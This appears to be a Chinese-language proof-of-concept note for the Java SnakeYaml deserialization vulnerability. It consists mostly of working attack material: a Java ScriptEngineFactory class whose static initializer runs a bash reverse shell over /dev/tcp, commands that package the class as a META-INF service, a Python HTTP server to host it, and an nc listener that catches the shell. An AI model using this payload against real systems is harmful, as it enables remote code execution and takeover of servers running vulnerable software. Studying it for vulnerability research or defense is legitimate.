Ref:
- [Java SnakeYaml反序列化漏洞](https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)


```java
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class PoC implements ScriptEngineFactory {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/7777 0>&1");
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```
编译：
```sh
javac PoC.java
mkdir -p META-INF/services/
cd META-INF/services/
echo "PoC" >  javax.script.ScriptEngineFactory
```
准备完成之后是这样的：
```
root@silicon:~/snakeyaml-poc# find .
.
./PoC.class
./META-INF
./META-INF/services
./META-INF/services/javax.script.ScriptEngineFactory
./PoC.java
```
然后启动web服务：
```
python3 -m http.server 8888
```
使用nc监听，待反弹shell。
```
nc -klvn 7777
```
